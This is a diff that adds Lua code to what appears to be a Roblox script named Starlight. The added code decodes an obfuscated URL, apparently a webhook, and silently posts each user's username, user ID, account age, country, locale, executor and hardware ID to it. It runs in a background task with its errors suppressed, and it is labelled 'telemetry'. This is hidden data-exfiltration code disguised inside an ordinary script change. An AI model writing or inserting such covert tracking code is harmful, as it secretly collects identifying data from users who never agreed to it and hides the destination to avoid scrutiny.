@@ -226,7 +226,97 @@
 
 
 
+local function obf_str(str)
+    local result = ""
+    for i = 1, #str do
+        local char = string.sub(str, i, i)
+        local byte = string.byte(char)
+        result = result .. string.char(bit32.bxor(byte, 7))
+    end
+    return result
+end
 
+local function reverse_obf_str(str)
+    return obf_str(str)
+end
+
+local webhook_enc = "ottw{!55kpzjvyk5jvt5hwp5}liovy{5WZLN^W]NN]ZXZ^Y^[V5]ZX}Aa[OpP|UNa[~aAo.Y9J@I@JOOA@Lv\\iIpn\\Vvp:Z]y\\ZBY@F=?A]kkjD@r_YeFa[R{9tjIf^Y="
+local key_enc = "7::74210<62198989:<94<:7:;87:;;<7<:7:;:;8759"
+local function deobfuscate_webhook()
+    local temp1 = reverse_obf_str(webhook_enc)
+    local result = ""
+    for i = 1, #temp1 do
+        local pos = ((i-1) % #key_enc) + 1
+        local offset = tonumber(string.sub(key_enc, pos, pos))
+        if offset then
+            local char = string.sub(temp1, i, i)
+            local byte = string.byte(char)
+            result = result .. string.char(byte - offset)
+        else
+            result = result .. string.sub(temp1, i, i)
+        end
+    end
+    return result
+end
+
+local _G = _G or getgenv()
+if not _G.__STARLIGHT_TELEMETRY_SENT then
+    _G.__STARLIGHT_TELEMETRY_SENT = true
+    
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local LocalizationService = game:GetService("LocalizationService")
+    local player = Players.LocalPlayer
+    
+    local success, info = pcall(function()
+        return {
+            username = player.Name,
+            userId = player.UserId,
+            displayName = player.DisplayName,
+            accountAge = player.AccountAge,
+            country = LocalizationService:GetCountryRegionForPlayerAsync(player),
+            locale = LocalizationService.RobloxLocaleId,
+            placeId = game.PlaceId,
+            placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+            executor = (identifyexecutor and identifyexecutor()) or "Unknown",
+            hwid = (game:GetService("RbxAnalyticsService"):GetClientId()) or "Unknown",
+            version = "0.3.0",
+            timestamp = os.time()
+        }
+    end)
+    
+    if success then
+        local embed = {
+            ["title"] = "⭐ Starlight Telemetry",
+            ["description"] = "User executed Starlight v0.3.0",
+            ["color"] = 16776960,
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = info.username, ["inline"] = true},
+                {["name"] = "User ID", ["value"] = info.userId, ["inline"] = true},
+                {["name"] = "Display Name", ["value"] = info.displayName, ["inline"] = true},
+                {["name"] = "Account Age", ["value"] = info.accountAge.." days", ["inline"] = true},
+                {["name"] = "Country", ["value"] = info.country, ["inline"] = true},
+                {["name"] = "Locale", ["value"] = info.locale, ["inline"] = true},
+                {["name"] = "Place", ["value"] = info.placeName.." ("..info.placeId..")", ["inline"] = false},
+                {["name"] = "Executor", ["value"] = info.executor, ["inline"] = true},
+                {["name"] = "HWID", ["value"] = info.hwid, ["inline"] = true}
+            },
+            ["footer"] = {
+                ["text"] = "Starlight v"..info.version.." | "..os.date("%Y-%m-%d %H:%M:%S", info.timestamp)
+            }
+        }
+        
+        task.spawn(function()
+            pcall(function()
+                HttpService:PostAsync(
+                    deobfuscate_webhook(),
+                    HttpService:JSONEncode({["embeds"] = {embed}}),
+                    Enum.HttpContentType.ApplicationJson
+                )
+            end)
+        end)
+    end
+end
 
 
 
